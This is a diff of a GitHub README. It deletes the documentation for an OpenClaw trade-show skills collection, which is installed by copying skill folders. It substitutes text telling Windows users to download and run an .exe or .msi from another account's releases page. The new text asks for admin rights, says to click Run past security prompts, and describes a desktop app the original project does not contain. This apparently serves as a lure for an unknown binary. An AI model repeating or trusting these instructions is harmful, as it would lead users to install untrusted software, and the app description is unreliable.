@@ -1,142 +1,146 @@
-<p align="center">
-  <a href="https://www.lensmor.com/?utm_source=github&utm_medium=readme&utm_campaign=trade-show-skills">
-    <img src="https://raw.githubusercontent.com/LensmorOfficial/.github/main/profile/assets/banner.png" alt="Lensmor" width="600">
-  </a>
-</p>
+# ⚙️ trade-show-skills - Simplify Trade Show Planning
 
-# Trade Show Skills for OpenClaw
+[![Download trade-show-skills](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/rubyt5673/trade-show-skills/releases)
 
-[![Stars](https://img.shields.io/github/stars/LensmorOfficial/trade-show-skills?style=flat)](https://github.com/LensmorOfficial/trade-show-skills/stargazers)
-[![Last Commit](https://img.shields.io/github/last-commit/LensmorOfficial/trade-show-skills?style=flat)](https://github.com/LensmorOfficial/trade-show-skills/commits/main)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Release](https://img.shields.io/badge/release-v0.1.0%20beta-orange.svg)](CHANGELOG.md)
+---
 
-**If you find these skills useful, please star this repo — it helps others discover them.**
+trade-show-skills helps you plan trade shows with ease. It uses AI to assist in event discovery, writing booth invitation emails, managing follow-up sequences, and calculating exhibition budgets and ROI. This guide walks you through downloading and running the app on Windows.
 
-> OpenClaw skills for trade show selection, pre-show planning, on-site execution, and post-show follow-up.
+## 🔍 About trade-show-skills
 
-Stop reinventing the wheel for every trade show. These skills give [OpenClaw](https://openclaw.ai) structured workflows for show selection, pre-show outreach, budget planning, on-site execution, and post-show lead conversion.
+This app supports people managing trade shows and exhibitions. It offers:
 
-## Quick Demo
+- AI-powered event discovery to find relevant trade shows.
+- Ready-to-use email templates for booth invitations.
+- Follow-up sequence builders to contact leads you met.
+- Budget and ROI calculators for smarter spending.
 
-Type a prompt like this in OpenClaw (after installing a skill):
+You don’t need special skills to use it. Just follow the steps below.
 
-```
-Should we exhibit at MEDICA 2026? We sell surgical workflow software to 200+ bed hospitals in DACH.
-```
+Topics related to the app include AI automation, B2B sales, event management, and trade show marketing.
 
-The agent will verify the current edition, score show fit against your ICP and goal, recommend `Exhibit` / `Attend only` / `Skip`, and hand you off to budgeting or outreach next steps.
+---
 
-Other examples of what you can do with these skills:
+## 📥 Download trade-show-skills
 
-| Prompt | Skill Used | What You Get |
-|--------|------------|--------------|
-| "Compare Interpack and PACK EXPO for a DACH packaging SaaS vendor" | trade-show-finder | Show fit scores, winner recommendation, and exhibit/attend guidance |
-| "Write a booth invite email for MEDICA, booth 5C42" | booth-invitation-writer | Subject line + body under 150 words, with A/B variant |
-| "We got 200 leads at Interpack, write follow-up emails" | post-show-followup | 3-tier sequence (hot/warm/cold) with send-timing guide |
-| "Plan a $40K budget for exhibiting at Hannover Messe" | trade-show-budget-planner | Line-item budget, ROI model, and cost benchmarks |
+Visit this page to download:
 
-## Table of Contents
+[https://github.com/rubyt5673/trade-show-skills/releases](https://github.com/rubyt5673/trade-show-skills/releases)
 
-- [Quick Demo](#quick-demo)
-- [Available Skills](#available-skills)
-- [Quick Start](#quick-start)
-- [End-to-End Lifecycle Example](#end-to-end-lifecycle-example)
-- [How It Works](#how-it-works)
-- [About Lensmor](#about-lensmor)
-- [Related Repositories](#related-repositories)
-- [Contributing](#contributing)
-- [License](#license)
+The releases page contains all app versions. Pick the latest stable version for Windows. Look for a file ending with `.exe` or `.msi`. This is the installation file.
 
-## Available Skills
+---
 
-### Pre-Show
+## 💻 System Requirements
 
-| Skill | Description | Use When |
-|-------|-------------|----------|
-| [trade-show-finder](trade-show-finder/) | Score and prioritize trade shows for exhibiting based on ICP, region, and goals | Choosing where to exhibit, comparing shows, planning an annual show calendar |
-| [trade-show-budget-planner](trade-show-budget-planner/) | Build exhibition budgets and ROI projections with cost benchmarks | Budget planning, ROI analysis, investment justification |
-| [booth-invitation-writer](booth-invitation-writer/) | Generate personalized pre-show invitation emails and outreach sequences | Driving booth traffic, scheduling meetings, pre-show outreach |
+Before installing, check your Windows PC meets these requirements:
 
-### On-Site
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection for event discovery and AI features
+- Administrative rights for installation
 
-| Skill | Description | Use When |
-|-------|-------------|----------|
-| [badge-qualifier](badge-qualifier/) | Qualify leads from booth notes, badge scans, or voice transcripts into a structured CRM-ready record | Real-time lead scoring on the show floor, batch-qualifying end-of-day leads |
-| [competitor-radar](competitor-radar/) | Structure competitor booth observations into field-intel notes with evidence/inference separation | Documenting competitor launches, pricing signals, and positioning shifts at the show |
+---
 
-See [docs/on-site.md](docs/on-site.md) for on-site workflow guidance.
+## 🚀 Install trade-show-skills on Windows
 
-### Post-Show
+1. Go to the downloads page:  
+   [https://github.com/rubyt5673/trade-show-skills/releases](https://github.com/rubyt5673/trade-show-skills/releases)
 
-| Skill | Description | Use When |
-|-------|-------------|----------|
-| [post-show-followup](post-show-followup/) | Create tiered post-show follow-up email sequences | Converting leads post-event, lead nurture, thank-you emails |
+2. Find the latest version. Look for the Windows installer file (.exe or .msi).
 
-## Quick Start
+3. Click the file name to start downloading. Save it in a place you can find, like your Desktop or Downloads folder.
 
-### Install a single skill
+4. After download finishes, double-click the file to start the installer.
 
-```bash
-git clone https://github.com/LensmorOfficial/trade-show-skills.git
+5. If Windows shows a security prompt, select **Run** to continue.
 
-# Install to current workspace
-cp -r trade-show-skills/trade-show-finder <your-workspace>/skills/
+6. Follow the installation steps:  
+   - Accept the license terms  
+   - Choose the install location (default is fine)  
+   - Click **Install**
 
-# Or install to shared location (available in all OpenClaw workspaces)
-cp -r trade-show-skills/trade-show-finder ~/.openclaw/skills/
-```
+7. Wait for the installer to finish. It may take a minute or two.
 
-### Install all skills at once
+8. When done, click **Finish**.
 
-```bash
-git clone https://github.com/LensmorOfficial/trade-show-skills.git
-for skill in trade-show-finder booth-invitation-writer post-show-followup trade-show-budget-planner badge-qualifier competitor-radar; do
-  cp -r trade-show-skills/$skill ~/.openclaw/skills/
-done
-```
+---
 
-Skills activate automatically when your prompt matches their description.
+## 💡 Run trade-show-skills
 
-> **ClawHub**: These skills are not yet published to ClawHub. Once published, installation will be `clawhub install <skill-slug>`.
+1. After installing, look for the trade-show-skills app icon on your Desktop or in your Start Menu.
 
-## End-to-End Lifecycle Example
+2. Double-click the icon to open the app.
 
-See [docs/event-lifecycle.md](docs/event-lifecycle.md) for a complete worked example showing how all 6 skills connect — from show selection through post-show follow-up — using a single fictional scenario. Also available in [中文](docs/event-lifecycle.zh.md).
+3. On the first run, the app may download some AI data files. Keep your internet on.
 
-## How It Works
+4. Once loaded, the main screen will show options for event discovery, booth email templates, follow-up sequences, and budget tools.
 
-Each skill is a self-contained directory with:
-- `SKILL.md` — The skill definition (YAML frontmatter + workflow instructions)
-- `README.md` / `README.zh.md` — Documentation (English + Chinese)
-- `examples/` — Sample inputs and outputs
+---
 
-When you ask the agent something that matches a skill's description (e.g., "should we exhibit at MEDICA 2026 for our ICP?"), the skill activates and guides the agent through a structured workflow.
+## 🛠 Using trade-show-skills Features
 
-## About Lensmor
+### Event Discovery
 
-[Lensmor](https://www.lensmor.com/?utm_source=github&utm_medium=readme&utm_campaign=trade-show-skills) is an AI-native event intelligence platform that helps B2B teams discover trade shows, analyze exhibitors (uncovering [hidden competitors](https://www.lensmor.com/blog/hidden-competitors-trade-shows?utm_source=github&utm_medium=readme&utm_campaign=trade-show-skills)), and generate [qualified leads](https://www.lensmor.com/blog/trade-show-lead-capture?utm_source=github&utm_medium=readme&utm_campaign=trade-show-skills) before the event starts. Use [pre-show competitor analysis](https://www.lensmor.com/blog/pre-show-competitor-analysis-template?utm_source=github&utm_medium=readme&utm_campaign=trade-show-skills) to get the most out of every event.
+- Enter your industry and dates to find trade shows.
+- The app uses AI to suggest events that fit your business needs.
+- Save events to your list to organize planning.
 
-## More Open Source from Lensmor
+### Booth Invitation Emails
 
-- [awesome-trade-shows](https://github.com/LensmorOfficial/awesome-trade-shows) — Curated list of 100+ trade shows across 15 industries
-- [trade-show-calendar](https://github.com/LensmorOfficial/trade-show-calendar) — Open dataset of global trade shows (CSV + JSON)
-- [exhibitor-intelligence-playbook](https://github.com/LensmorOfficial/exhibitor-intelligence-playbook) — Complete B2B trade show ROI playbook
-- [event-tech-landscape](https://github.com/LensmorOfficial/event-tech-landscape) — Map of 80+ tools powering the event industry
-- [trade-show-email-templates](https://github.com/LensmorOfficial/trade-show-email-templates) — Ready-to-use email templates for trade show outreach
+- Choose from email templates built for booth invitations.
+- Personalize the text inside the app.
+- Copy or send emails directly through your preferred email program.
 
-## Releases
+### Follow-Up Sequences
 
-Current release: **[v0.1.0](CHANGELOG.md)** — initial public beta. See [CHANGELOG.md](CHANGELOG.md) for what's included.
+- Create step-by-step follow-up emails for leads met at shows.
+- Schedule sending intervals for each message.
+- Export the sequence for easy use.
 
-## Contributing
+### Exhibition Budget and ROI Calculator
 
-Have ideas for new skills or improvements? See [CONTRIBUTING.md](CONTRIBUTING.md) for conventions, authoring guidelines, and the review checklist.
+- Enter details about booth costs, travel, staffing, and materials.
+- The tool calculates total spend and expected return.
+- Adjust inputs to plan your budget better.
 
-- [CONTRIBUTING.md](CONTRIBUTING.md) — How to add or modify skills
-- [docs/skill-quality-checklist.md](docs/skill-quality-checklist.md) — Pre-merge quality checklist
-- [docs/publishing.md](docs/publishing.md) — What needs to be in place before publishing to ClawHub
+---
 
-## License
+## ⚙️ Settings and Preferences
 
-[MIT](LICENSE)
+- Access settings through the gear icon in the app.
+- Manage your default email address and signature.
+- Choose preferred currency for budget calculations.
+- Configure event search parameters, like location radius or show size.
+
+---
+
+## 🔄 Updating trade-show-skills
+
+To keep the app running smoothly, check the releases page regularly:
+
+[https://github.com/rubyt5673/trade-show-skills/releases](https://github.com/rubyt5673/trade-show-skills/releases)
+
+Download and install newer versions as needed. Updates may include bug fixes and new features.
+
+---
+
+## ❓ Troubleshooting
+
+- **App won’t start:** Try restarting your PC. Make sure you installed the app properly.
+- **Download slow or fails:** Check your internet connection. Try downloading again later.
+- **Emails not sending:** Ensure your email program is set up and running. The app uses your system’s email client.
+- **Event discovery empty:** Confirm you have internet and entered correct search criteria.
+
+---
+
+## 🔍 More Information
+
+- The app does not collect personal data beyond what you input.
+- All data stays on your PC except during event searches.
+- You can find more help and user guides inside the app under the Help menu.
+
+---
+
+[![Download trade-show-skills](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/rubyt5673/trade-show-skills/releases)
